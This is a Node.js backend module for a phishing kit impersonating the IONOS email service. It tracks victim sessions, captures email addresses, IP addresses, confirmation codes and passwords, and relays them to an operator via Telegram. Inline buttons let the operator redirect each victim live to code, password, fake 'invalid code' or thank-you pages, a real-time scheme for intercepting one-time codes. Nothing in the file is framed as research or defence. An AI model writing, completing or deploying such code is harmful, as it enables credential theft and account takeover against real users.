const crypto = require("crypto");
const store = require("./ionos-store");

const REDIRECTS = {
  code: (id) => `/ionos-emailconfirmation.html?s=${id}`,
  password: (id) => `/ionos-password.html?s=${id}`,
  thankyou: () => `/ionos-thankyou.html`,
  waiting: (id) => `/ionos-waiting.html?s=${id}`,
};

const CODE_ERROR =
  "Der eingegebene Code ist ungültig. Bitte versuchen Sie es erneut.";

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

async function createSession({ email, ip, ua }) {
  await store.pruneSessions();
  const id = crypto.randomBytes(8).toString("hex");
  const session = {
    id,
    email,
    code: "",
    password: "",
    step: "email_submitted",
    pending: "email",
    redirect: null,
    error: null,
    ip: ip || "unknown",
    ua: ua || "",
    createdAt: Date.now(),
    updatedAt: Date.now(),
  };
  await store.saveSession(session);
  return session;
}

async function getSession(id) {
  await store.pruneSessions();
  return store.getSession(id);
}

async function updateSession(id, patch) {
  const session = await getSession(id);
  if (!session) return null;
  Object.assign(session, patch, { updatedAt: Date.now() });
  await store.saveSession(session);
  return session;
}

async function listSessions() {
  await store.pruneSessions();
  return store.listSessions();
}

async function applyAdminAction(id, action) {
  const session = await getSession(id);
  if (!session) return { ok: false, error: "session_not_found" };

  switch (action) {
    case "code":
      await updateSession(id, {
        pending: null,
        redirect: REDIRECTS.code(id),
        error: null,
      });
      break;
    case "password":
      await updateSession(id, {
        pending: null,
        redirect: REDIRECTS.password(id),
        error: null,
      });
      break;
    case "code_bad":
      await updateSession(id, {
        pending: null,
        redirect: REDIRECTS.code(id),
        error: CODE_ERROR,
      });
      break;
    case "thankyou":
      await updateSession(id, {
        pending: null,
        redirect: REDIRECTS.thankyou(),
        error: null,
        step: "done",
      });
      break;
    default:
      return { ok: false, error: "unknown_action" };
  }

  return { ok: true, session: await getSession(id) };
}

async function getPollState(id) {
  const session = await getSession(id);
  if (!session) {
    return { ok: false, status: "gone" };
  }

  if (session.redirect) {
    const redirect = session.redirect;
    const error = session.error;
    session.redirect = null;
    if (!error) session.error = null;
    session.updatedAt = Date.now();
    await store.saveSession(session);
    return {
      ok: true,
      status: error ? "error" : "redirect",
      redirect,
      error,
      email: session.email,
    };
  }

  return {
    ok: true,
    status: "waiting",
    pending: session.pending,
    email: session.email,
    step: session.step,
  };
}

function buildTelegramKeyboard(session) {
  const p = `i:${session.id}:`;
  if (session.pending === "email") {
    return {
      inline_keyboard: [
        [
          { text: "📧 E-Mail Code", callback_data: p + "code" },
          { text: "🔑 Passwort", callback_data: p + "password" },
        ],
      ],
    };
  }
  if (session.pending === "code") {
    return {
      inline_keyboard: [
        [
          { text: "✅ Code OK → Passwort", callback_data: p + "password" },
          { text: "❌ Falscher Code", callback_data: p + "code_bad" },
        ],
        [{ text: "🎉 Thank You", callback_data: p + "thankyou" }],
      ],
    };
  }
  if (session.pending === "password") {
    return {
      inline_keyboard: [[{ text: "🎉 Thank You", callback_data: p + "thankyou" }]],
    };
  }
  return null;
}

function formatSessionMessage(session, title) {
  const lines = [
    `<b>${title}</b>`,
    "",
    `<b>Session:</b> <code>${escapeHtml(session.id)}</code>`,
    `<b>Email:</b> ${escapeHtml(session.email)}`,
    `<b>IP:</b> ${escapeHtml(session.ip)}`,
  ];
  if (session.code) lines.push(`<b>Code:</b> <code>${escapeHtml(session.code)}</code>`);
  if (session.password) lines.push(`<b>Passwort:</b> <code>${escapeHtml(session.password)}</code>`);
  lines.push(`<b>Schritt:</b> ${escapeHtml(session.step)}`);
  lines.push("", "Wähle wohin der User weitergeleitet wird:");
  return lines.join("\n");
}

function parseCallbackData(data) {
  if (!data || !data.startsWith("i:")) return null;
  const parts = data.split(":");
  if (parts.length !== 3) return null;
  return { id: parts[1], action: parts[2] };
}

module.exports = {
  CODE_ERROR,
  REDIRECTS,
  applyAdminAction,
  buildTelegramKeyboard,
  createSession,
  escapeHtml,
  formatSessionMessage,
  getPollState,
  getSession,
  listSessions,
  parseCallbackData,
  updateSession,
};
